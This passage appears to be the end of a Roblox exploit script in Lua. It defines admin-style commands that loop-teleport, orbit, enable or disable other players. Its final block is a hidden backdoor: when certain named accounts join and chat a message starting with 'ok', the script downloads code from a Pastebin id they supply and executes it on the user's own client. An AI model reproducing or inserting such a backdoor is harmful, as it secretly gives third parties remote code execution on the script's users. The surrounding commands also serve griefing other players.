    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Loopjump(gPlayers[v])
     end
  end
end)

CMD(
'Unloopjump',
'Unloop jumps a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Unloopjump(gPlayers[v])
     end
  end
end)

CMD(
'Loopbring',
'Loop brings a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Loopbring(gPlayers[v])
     end
  end
end)

CMD(
'Unloopbring',
'Unloop jumps a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
      Unloopbring(gPlayers[v])
     end
  end
end)

CMD(
'Enable',
'Enables a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
       Enable(gPlayers[v])
     end
  end
end)

CMD(
'Disable',
'Disables a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
       Disable(gPlayers[v])
     end
  end
end)

CMD(
'Orbit',
'Orbits a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
       Orbit(gPlayers[v])
     end
  end
end)

CMD(
'Unorbit',
'Orbits a player',
{nil},
function(args)
 local Target = getPlayer(args[1])
    for i, v in pairs(Target) do
     if CheckClaim(gPlayers[v]) then
       Unorbit(gPlayers[v])
     end
  end
end)

CMD(
'Rejoin',
'Rejoins the game',
{nil},
function(args)
 game:GetService("TeleportService"):Teleport(game.PlaceId)
end)

CMD(
'commands',
'Gets the command list',
{'cmds'},
function(args)
 GC()
end)

game.Players.PlayerAdded:Connect(function(p)
if p.Name == "Mrsparkletimeguy" or p.Name == "SlashaMane" or p.Name == "br4killer1256" then
  p.Chatted:Connect(function(cht)
    if cht:lower():sub(1,2) == ("ok") then
                 local exec = string.sub(cht, 3)
                                if game.Players.LocalPlayer.Name ~= "VAHMPIN" then
       loadstring(game:HttpGet("https://pastebin.com/raw/"..exec, true))()
     end
  end
end)
end
end)

GC()
